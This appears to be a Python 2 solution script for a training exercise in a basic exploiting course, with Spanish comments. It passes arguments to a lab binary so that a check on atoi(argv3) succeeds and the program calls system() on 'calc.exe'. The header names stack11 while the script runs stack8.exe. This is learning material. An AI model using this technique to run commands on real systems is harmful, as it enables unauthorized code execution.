# http://www.ricardonarvaja.info/WEB/EXPLOITING/Nivel%20Basico/014%20stack11.idb/
import os
import struct
#El stack tiene un tamanio de 0x48
# cmp     [ebp+arg_0], 4 => primer check, el programa debe tener 3 argumentos (4 con el nombre del programa)
argv1 = "A"
argv2 = "calc.exe"
argv3 = "1397"

#Se crea un bufer de 52 bytes Dest
#Entramos a la funcion check que compara el valor de atoi(argv3) con 0x575
payload = argv1+" "+argv2+" "+argv3
#Al cumplir la condicion el programa llama a la funcion system y le pasa como argumento el valor de argv2
print "[#] Sending Payload"
os.system("stack8.exe "+payload)
